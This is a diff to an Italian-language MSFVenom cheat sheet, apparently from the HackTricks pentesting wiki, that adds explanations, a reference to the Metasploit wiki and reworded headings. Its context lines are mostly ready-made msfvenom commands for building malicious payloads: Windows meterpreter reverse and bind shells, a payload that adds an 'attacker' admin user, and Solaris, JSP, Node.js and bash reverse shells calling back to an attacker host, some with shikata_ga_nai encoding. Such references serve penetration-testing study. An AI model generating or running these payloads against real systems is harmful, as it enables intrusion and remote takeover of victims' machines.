@@ -1,20 +1,20 @@
 # MSFVenom - CheatSheet
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ---
 
 ## msfvenom di base
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-È inoltre possibile usare `-a` per specificare l'architettura o `--platform`
+Usa `-a` per selezionare l'architettura del payload e `--platform` per selezionare la piattaforma target.<sup>[[1]](#references)</sup>
 
 ## Elenco
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
+Questi comandi elencano i moduli payload ed encoder disponibili nel framework installato.<sup>[[1]](#references)</sup>
+
 ## Parametri comuni durante la creazione di uno shellcode
 ```bash
 -b "\x00\x0a\x0d"
@@ -23,6 +23,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+I flag mostrati qui selezionano i bad characters, il formato di output, l'encoder e le iterazioni di encoding.<sup>[[1]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -33,7 +35,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-### Crea utente
+### Creare un utente
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
@@ -69,7 +71,7 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-## **Payload per MAC**
+## **MAC Payloads**
 
 ### **Reverse Shell:**
 ```bash
@@ -111,7 +113,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payload in Script Language**
+## **Payload in linguaggio di scripting**
 
 ### **Perl**
 ```bash
@@ -125,4 +127,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## References
+
+- [1] [Come usare msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
